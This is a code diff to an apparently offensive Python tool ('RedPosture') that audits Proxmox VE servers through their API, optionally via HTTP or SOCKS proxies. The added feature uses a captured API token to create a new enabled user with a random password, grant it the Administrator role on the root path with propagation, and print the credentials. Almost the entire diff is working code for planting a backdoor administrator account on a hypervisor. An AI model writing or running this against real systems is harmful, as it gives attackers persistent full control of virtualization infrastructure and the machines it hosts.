@@ -10,8 +10,10 @@ import ipaddress
 import json
 import os
 import re
+import secrets
 import socket
 import ssl
+import string
 import sys
 import threading
 import time
@@ -34,6 +36,10 @@ _CONNECTION_TIMEOUT_PREFIX = "connection timeout"
 _MAX_HTTP_BODY_BYTES = 262_144
 _MAX_FINDINGS_PER_TARGET = 200
 _MAX_FINDINGS_PER_ENDPOINT = 40
+_ADD_USER_PASSWORD_LENGTH = 20
+_ADD_USER_PASSWORD_ALPHABET = string.ascii_letters + string.digits
+_ADD_USER_PRIV_ROLE = "Administrator"
+_ADD_USER_PRIV_PATH = "/"
 
 _SENSITIVE_KEY_TOKENS = (
     "password",
@@ -247,6 +253,22 @@ def _auth_header_value(pve_api_token: str) -> str:
     return f"PVEAPIToken={token}"
 
 
+def _generate_random_password(length: int = _ADD_USER_PASSWORD_LENGTH) -> str:
+    size = max(1, int(length))
+    return "".join(secrets.choice(_ADD_USER_PASSWORD_ALPHABET) for _ in range(size))
+
+
+def _normalize_add_user_id(raw_username: str) -> str | None:
+    user_value = str(raw_username or "").strip()
+    if not user_value:
+        return None
+    if any(ch.isspace() for ch in user_value):
+        return None
+    if "@" not in user_value:
+        return f"{user_value}@pve"
+    return user_value
+
+
 def _recv_exact(sock: socket.socket, size: int) -> bytes:
     data = b""
     while len(data) < size:
@@ -357,6 +379,8 @@ def _request_via_socks_proxy(
     use_https: bool,
     insecure: bool,
     proxy: _ProxyConfig,
+    method: str = "GET",
+    data: bytes | None = None,
 ) -> tuple[int, bytes, dict[str, str], str | None]:
     sock: socket.socket | None = None
     transport_sock: socket.socket | ssl.SSLSocket | None = None
@@ -372,19 +396,23 @@ def _request_via_socks_proxy(
             transport_sock = ctx.wrap_socket(sock, server_hostname=host)
             transport_sock.settimeout(timeout)
 
+        request_method = str(method or "GET").upper()
         request_path = f"{_PROXMOX_API_PREFIX}{path}"
         host_header = f"{host}:{port}"
-        headers = [
-            f"GET {request_path} HTTP/1.1",
+        header_lines = [
+            f"{request_method} {request_path} HTTP/1.1",
             f"Host: {host_header}",
             "User-Agent: RedPosture/1.0",
             "Accept: application/json,text/plain,*/*",
             f"Authorization: {_auth_header_value(pve_api_token)}",
             "Connection: close",
-            "",
-            "",
         ]
-        transport_sock.sendall("\r\n".join(headers).encode("utf-8", errors="replace"))
+        body = data if data else b""
+        if body:
+            header_lines.append("Content-Type: application/x-www-form-urlencoded")
+            header_lines.append(f"Content-Length: {len(body)}")
+        header_lines.extend(("", ""))
+        transport_sock.sendall("\r\n".join(header_lines).encode("utf-8", errors="replace") + body)
         return _read_http_response_from_socket(transport_sock)
     except (ssl.SSLError, OSError, ValueError) as exc:
         return 0, b"", {}, _friendly_error_from_exception(exc)
@@ -411,17 +439,25 @@ def _request_via_http_proxy(
     use_https: bool,
     insecure: bool,
     proxy: _ProxyConfig,
+    method: str = "GET",
+    data: bytes | None = None,
 ) -> tuple[int, bytes, dict[str, str], str | None]:
     scheme = "https" if use_https else "http"
     url = f"{scheme}://{host}:{port}{_PROXMOX_API_PREFIX}{path}"
+    request_method = str(method or "GET").upper()
+    body = data if data else None
+    request_headers = {
+        "User-Agent": "RedPosture/1.0",
+        "Accept": "application/json,text/plain,*/*",
+        "Authorization": _auth_header_value(pve_api_token),
+    }
+    if body:
+        request_headers["Content-Type"] = "application/x-www-form-urlencoded"
     request = urllib.request.Request(
         url,
-        method="GET",
-        headers={
-            "User-Agent": "RedPosture/1.0",
-            "Accept": "application/json,text/plain,*/*",
-            "Authorization": _auth_header_value(pve_api_token),
-        },
+        data=body,
+        method=request_method,
+        headers=request_headers,
     )
 
     handlers: list[Any] = [urllib.request.ProxyHandler({"http": proxy.raw_url, "https": proxy.raw_url})]
@@ -452,7 +488,11 @@ def _proxmox_request_once(
     use_https: bool,
     insecure: bool,
     proxy: _ProxyConfig | None,
+    method: str = "GET",
+    form: dict[str, Any] | None = None,
 ) -> tuple[int, bytes, dict[str, str], str | None]:
+    request_method = str(method or "GET").upper()
+    request_body = urllib.parse.urlencode(form or {}, doseq=True).encode("utf-8") if form else None
     if proxy is not None:
         if proxy.scheme in {"http", "https"}:
             return _request_via_http_proxy(
@@ -464,6 +504,8 @@ def _proxmox_request_once(
                 use_https=use_https,
                 insecure=insecure,
                 proxy=proxy,
+                method=request_method,
+                data=request_body,
             )
         if proxy.scheme in {"socks5", "socks5h"}:
             return _request_via_socks_proxy(
@@ -475,19 +517,25 @@ def _proxmox_request_once(
                 use_https=use_https,
                 insecure=insecure,
                 proxy=proxy,
+                method=request_method,
+                data=request_body,
             )
         return 0, b"", {}, "unsupported proxy scheme"
 
     scheme = "https" if use_https else "http"
     url = f"{scheme}://{host}:{port}{_PROXMOX_API_PREFIX}{path}"
+    request_headers = {
+        "User-Agent": "RedPosture/1.0",
+        "Accept": "application/json,text/plain,*/*",
+        "Authorization": _auth_header_value(pve_api_token),
+    }
+    if request_body:
+        request_headers["Content-Type"] = "application/x-www-form-urlencoded"
     request = urllib.request.Request(
         url,
-        method="GET",
-        headers={
-            "User-Agent": "RedPosture/1.0",
-            "Accept": "application/json,text/plain,*/*",
-            "Authorization": _auth_header_value(pve_api_token),
-        },
+        data=request_body,
+        method=request_method,
+        headers=request_headers,
     )
     handlers: list[Any] = []
     if use_https:
@@ -518,6 +566,8 @@ def _proxmox_request(
     use_https: bool,
     insecure: bool,
     proxy: _ProxyConfig | None,
+    method: str = "GET",
+    form: dict[str, Any] | None = None,
 ) -> tuple[int, bytes, dict[str, str], str | None]:
     attempts = max(1, retries + 1)
     last_error: str | None = None
@@ -531,6 +581,8 @@ def _proxmox_request(
             use_https=use_https,
             insecure=insecure,
             proxy=proxy,
+            method=method,
+            form=form,
         )
         if error is None:
             return status, payload, response_headers, None
@@ -1114,6 +1166,7 @@ def _audit_proxmox_host(
     discover_creds: bool = False,
     show_nodes: bool = False,
     show_users: bool = False,
+    add_user: str | None = None,
     on_status_ready: Callable[[dict[str, Any]], None] | None = None,
     on_discovered_url: Callable[[str], None] | None = None,
     on_credential_finding: Callable[[dict[str, str]], None] | None = None,
@@ -1124,6 +1177,7 @@ def _audit_proxmox_host(
     stream_started = False
     streamed_url_count = 0
     streamed_finding_count = 0
+    requested_add_user = str(add_user or "").strip()
 
     def flush_stream_buffers() -> None:
         nonlocal streamed_url_count, streamed_finding_count
@@ -1143,26 +1197,45 @@ def _audit_proxmox_host(
                 if isinstance(finding, dict):
                     on_credential_finding(finding)
 
-    def fetch(path: str) -> tuple[int, bytes, str | None]:
+    def fetch(
+        path: str,
+        *,
+        method: str = "GET",
+        form: dict[str, Any] | None = None,
+    ) -> tuple[int, bytes, str | None]:
+        request_method = str(method or "GET").upper()
+        request_kwargs: dict[str, Any] = {
+            "pve_api_token": pve_api_token,
+            "use_https": use_https,
+            "insecure": insecure,
+            "proxy": proxy,
+        }
+        if request_method != "GET" or form:
+            request_kwargs["method"] = request_method
+            request_kwargs["form"] = form
         status, payload, _headers, error = _proxmox_request(
             host,
             port,
             path,
             timeout,
             retries,
-            pve_api_token=pve_api_token,
-            use_https=use_https,
-            insecure=insecure,
-            proxy=proxy,
+            **request_kwargs,
         )
         endpoint_results.append(
             {
                 "path": path,
                 "status": status,
                 "error": error,
+                "method": request_method,
             }
         )
-        if discover_creds and status == 200 and payload and len(findings) < _MAX_FINDINGS_PER_TARGET:
+        if (
+            discover_creds
+            and request_method == "GET"
+            and status == 200
+            and payload
+            and len(findings) < _MAX_FINDINGS_PER_TARGET
+        ):
             _scan_endpoint_payload(path, payload, findings, findings_seen)
         flush_stream_buffers()
         return status, payload, error
@@ -1184,6 +1257,13 @@ def _audit_proxmox_host(
             "show_users": show_users,
             "users": None,
             "users_error": None,
+            "add_user": requested_add_user or None,
+            "added_user": None,
+            "added_password": None,
+            "add_user_error": None,
+            "add_user_privileges_granted": None,
+            "add_user_privileges_role": None,
+            "add_user_privileges_error": None,
             "cap_adduser": None,
             "cap_read": None,
             "cap_modify": None,
@@ -1250,6 +1330,13 @@ def _audit_proxmox_host(
             "show_users": show_users,
             "users": users,
             "users_error": users_error,
+            "add_user": requested_add_user or None,
+            "added_user": None,
+            "added_password": None,
+            "add_user_error": None,
+            "add_user_privileges_granted": None,
+            "add_user_privileges_role": None,
+            "add_user_privileges_error": None,
             "cap_adduser": cap_adduser,
             "cap_read": cap_read,
             "cap_modify": cap_modify,
@@ -1282,6 +1369,13 @@ def _audit_proxmox_host(
             "show_users": show_users,
             "users": None,
             "users_error": None,
+            "add_user": requested_add_user or None,
+            "added_user": None,
+            "added_password": None,
+            "add_user_error": None,
+            "add_user_privileges_granted": None,
+            "add_user_privileges_role": None,
+            "add_user_privileges_error": None,
             "cap_adduser": None,
             "cap_read": None,
             "cap_modify": None,
@@ -1318,6 +1412,58 @@ def _audit_proxmox_host(
         cap_modify = caps["modify"]
         cap_backup = caps["backup"]
 
+    added_user: str | None = None
+    added_password: str | None = None
+    add_user_error: str | None = None
+    add_user_privileges_granted: bool | None = None
+    add_user_privileges_role: str | None = None
+    add_user_privileges_error: str | None = None
+    if requested_add_user:
+        add_user_id = _normalize_add_user_id(requested_add_user)
+        if not add_user_id:
+            add_user_error = "invalid username format for -add-user"
+        else:
+            candidate_password = _generate_random_password()
+            add_status, add_payload, add_fetch_error = fetch(
+                "/access/users",
+                method="POST",
+                form={
+                    "userid": add_user_id,
+                    "password": candidate_password,
+                    "enable": "1",
+                },
+            )
+            if add_fetch_error:
+                add_user_error = add_fetch_error
+            elif add_status not in {200, 201}:
+                add_user_error = (
+                    _extract_error_message(add_payload) or f"unexpected HTTP {add_status} from /access/users"
+                )
+            else:
+                added_user = add_user_id
+                added_password = candidate_password
+                acl_status, acl_payload, acl_fetch_error = fetch(
+                    "/access/acl",
+                    method="PUT",
+                    form={
+                        "path": _ADD_USER_PRIV_PATH,
+                        "users": add_user_id,
+                        "roles": _ADD_USER_PRIV_ROLE,
+                        "propagate": "1",
+                    },
+                )
+                if acl_fetch_error:
+                    add_user_privileges_granted = False
+                    add_user_privileges_error = acl_fetch_error
+                elif acl_status not in {200, 201}:
+                    add_user_privileges_granted = False
+                    add_user_privileges_error = (
+                        _extract_error_message(acl_payload) or f"unexpected HTTP {acl_status} from /access/acl"
+                    )
+                else:
+                    add_user_privileges_granted = True
+                    add_user_privileges_role = _ADD_USER_PRIV_ROLE
+
     users: list[str] | None = None
     users_error: str | None = None
     if show_users:
@@ -1342,6 +1488,13 @@ def _audit_proxmox_host(
         "cap_read": cap_read,
         "cap_modify": cap_modify,
         "cap_backup": cap_backup,
+        "add_user": requested_add_user or None,
+        "added_user": added_user,
+        "added_password": added_password,
+        "add_user_error": add_user_error,
+        "add_user_privileges_granted": add_user_privileges_granted,
+        "add_user_privileges_role": add_user_privileges_role,
+        "add_user_privileges_error": add_user_privileges_error,
         "error": None,
     }
     if on_status_ready is not None:
@@ -1447,6 +1600,13 @@ def _audit_proxmox_host(
         "show_users": show_users,
         "users": users,
         "users_error": users_error,
+        "add_user": requested_add_user or None,
+        "added_user": added_user,
+        "added_password": added_password,
+        "add_user_error": add_user_error,
+        "add_user_privileges_granted": add_user_privileges_granted,
+        "add_user_privileges_role": add_user_privileges_role,
+        "add_user_privileges_error": add_user_privileges_error,
         "cap_adduser": cap_adduser,
         "cap_read": cap_read,
         "cap_modify": cap_modify,
@@ -1662,6 +1822,56 @@ def _format_users_detail_records(record: dict[str, Any], output_format: str) -> 
     return lines
 
 
+def _format_add_user_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
+    requested_user = str(record.get("add_user") or "").strip()
+    if not requested_user:
+        return []
+
+    added_user = str(record.get("added_user") or "").strip()
+    added_password = str(record.get("added_password") or "").strip()
+    add_user_error = str(record.get("add_user_error") or "").strip()
+    add_user_privileges_granted = record.get("add_user_privileges_granted")
+    add_user_privileges_role = str(record.get("add_user_privileges_role") or _ADD_USER_PRIV_ROLE).strip()
+    add_user_privileges_error = str(record.get("add_user_privileges_error") or "").strip()
+
+    if output_format == "json":
+        return [
+            json.dumps(
+                {
+                    "timestamp": record.get("timestamp"),
+                    "type": "add_user",
+                    "service": "proxmox",
+                    "host": record.get("host"),
+                    "port": record.get("port"),
+                    "requested_user": requested_user,
+                    "added_user": added_user or None,
+                    "added_password": added_password or None,
+                    "privileges_granted": bool(add_user_privileges_granted)
+                    if add_user_privileges_granted is not None
+                    else None,
+                    "privileges_role": add_user_privileges_role or None,
+                    "privileges_error": add_user_privileges_error or None,
+                    "error": add_user_error or None,
+                },
+                ensure_ascii=False,
+            )
+        ]
+
+    prefix = _nxc_prefix(record)
+    if added_user and added_password and add_user_privileges_granted is True:
+        return [
+            f"{prefix} [+] User {added_user} added with password {added_password} "
+            f"and granted privileges {add_user_privileges_role or _ADD_USER_PRIV_ROLE}"
+        ]
+    if added_user and added_password:
+        error_text = _clip(add_user_privileges_error or "failed to grant administrator privileges", 120)
+        return [
+            f"{prefix} [!] User {added_user} added with password {added_password}, but privileges were not granted err={error_text}"
+        ]
+    error_text = _clip(add_user_error or "failed to add user", 120)
+    return [f"{prefix} [-] failed to add user {requested_user} err={error_text}"]
+
+
 def _render_colored_proxmox_line(console: Console, line: str) -> bool:
     if not line.startswith("PROXMOX"):
         return False
@@ -1823,6 +2033,7 @@ def audit_proxmox_targets(
     discover_creds: bool,
     show_nodes: bool,
     show_users: bool,
+    add_user: str | None,
     output_path: str | None,
     output_format: str,
     emit_line: Callable[[str], None] | None = None,
@@ -1864,6 +2075,7 @@ def audit_proxmox_targets(
                     discover_creds=discover_creds,
                     show_nodes=show_nodes,
                     show_users=show_users,
+                    add_user=add_user,
                     on_discovered_url=(
                         (
                             lambda path, _host=host: _stream_proxmox_discovered_url(
@@ -1943,6 +2155,8 @@ def audit_proxmox_targets(
                     if not stream_discovery:
                         for detail_line in _format_discovered_urls_detail_records(record, output_format):
                             _emit_line(out_fh, emit_line, detail_line)
+                    for detail_line in _format_add_user_detail_records(record, output_format):
+                        _emit_line(out_fh, emit_line, detail_line)
                     for detail_line in _format_nodes_detail_records(record, output_format):
                         _emit_line(out_fh, emit_line, detail_line)
                     for detail_line in _format_users_detail_records(record, output_format):
@@ -2017,8 +2231,9 @@ def run_proxmox_stage(args: argparse.Namespace, logger: AttemptLogger) -> int:
 
     stream_to_stdout = not bool(args.output)
     discover_creds = bool(getattr(args, "discover_creds", False))
-    show_nodes = bool(getattr(args, "show_nodes", False))
-    show_users = bool(getattr(args, "show_users", False))
+    show_nodes = bool(getattr(args, "nodes", False) or getattr(args, "show_nodes", False))
+    show_users = bool(getattr(args, "users", False) or getattr(args, "show_users", False))
+    add_user = str(getattr(args, "add_user", "") or "").strip()
 
     def emit_line(line: str) -> None:
         if args.output_format != "txt":
@@ -2043,7 +2258,8 @@ def run_proxmox_stage(args: argparse.Namespace, logger: AttemptLogger) -> int:
         console.info(
             f"proxmox audit started: hosts={len(hosts)} ports={len(ports)} timeout={args.timeout}s "
             f"workers={args.workers} retries={args.retries} https={bool(args.https)} insecure={bool(args.insecure)} "
-            f"discover_creds={discover_creds} nodes={show_nodes} users={show_users} proxy={proxy_mode} output={destination}"
+            f"discover_creds={discover_creds} nodes={show_nodes} users={show_users} add_user={bool(add_user)} "
+            f"proxy={proxy_mode} output={destination}"
         )
 
     total = 0
@@ -2067,6 +2283,7 @@ def run_proxmox_stage(args: argparse.Namespace, logger: AttemptLogger) -> int:
                 discover_creds=discover_creds,
                 show_nodes=show_nodes,
                 show_users=show_users,
+                add_user=add_user or None,
                 output_path=args.output,
                 output_format=args.output_format,
                 emit_line=emit_line,
